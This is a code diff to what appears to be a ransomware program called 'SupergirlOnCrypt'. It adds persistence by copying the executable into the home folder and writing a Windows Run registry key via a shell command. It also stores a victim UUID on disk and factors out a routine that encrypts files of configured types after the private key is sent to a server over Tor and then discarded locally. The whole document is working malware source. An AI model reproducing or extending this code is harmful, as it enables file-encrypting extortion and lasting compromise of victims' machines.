@@ -9,6 +9,7 @@ import platform
 import uuid
 import Config
 import json
+import os
 from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
@@ -24,10 +25,45 @@ def init():
     tor = TorManager()
     tor.startProxy()
     _session = tor.getSession()
-    id = genKeyPair()
-    app = QApplication(sys.argv)
-    oMainwindow = GUI(id)
-    sys.exit(app.exec_())
+    if os.path.isfile(str(Path.home()) + '/supergirl.uuid'):
+        id = open(str(Path.home()) + '/supergirl.uuid', "r").read()
+        _helper.info('Using existing UUID => ' + id)
+    else:
+        id = genKeyPair()
+        _helper.info('Generating UUID => ' + id)
+        _helper.write_file(str(Path.home()) + '/supergirl.uuid', id)
+
+    makePersistence()
+    startGui(id)
+
+def startGui(id):
+    if sys.platform == "linux" or sys.platform == "linux2":
+        if not os.environ.get('XDG_CURRENT_DESKTOP') is None:
+            app = QApplication(sys.argv)
+            oMainwindow = GUI(id)
+            sys.exit(app.exec_())
+    else:
+        app = QApplication(sys.argv)
+        oMainwindow = GUI(id)
+        sys.exit(app.exec_())
+
+def makePersistence():
+    if getattr(sys, 'frozen', False):
+        import shutil
+        dest = str(Path.home()) + '/SupergirlOnCrypt'
+        if sys.platform == "win32":
+            dest = dest + ".exe"
+            dest = dest.replace('\\', '/')
+        shutil.copyfile(sys.executable, dest)
+        if sys.platform == "win32":
+            cmd = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SupergirlOnCrypt" /t REG_SZ /F /D '
+            cmd = cmd + '"' + dest + '"'
+            os.system('start /wait cmd /c ' + cmd)
+        elif sys.platform == 'linux' or sys.platform == 'linux2':
+            #TODO: Linux persistence
+            pass
+    else:
+        _helper.warning('Not running as a frozen file - skipping persistence')
 
 
 def genKeyPair():
@@ -46,7 +82,10 @@ def genKeyPair():
     req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
     _helper.debug("Got Response from /users/add => " + str(req.json()))
     keys.forgetPrivate()
+    encryptAllFiles(keys)
+    return unique_id
 
+def encryptAllFiles(keys):
     pathlist = []
     for types in Config.FILE_TYPES:
         pathlist.extend(Path('./test_files').glob('**/*.' + types))
@@ -58,8 +97,6 @@ def genKeyPair():
             _helper.info("Encrypted " + path_in_str)
         except IOError:
             _helper.error("Could not encrypt " + path_in_str)
-
-    return unique_id
 
 
 def encryptClientPrivKey(priv_key):
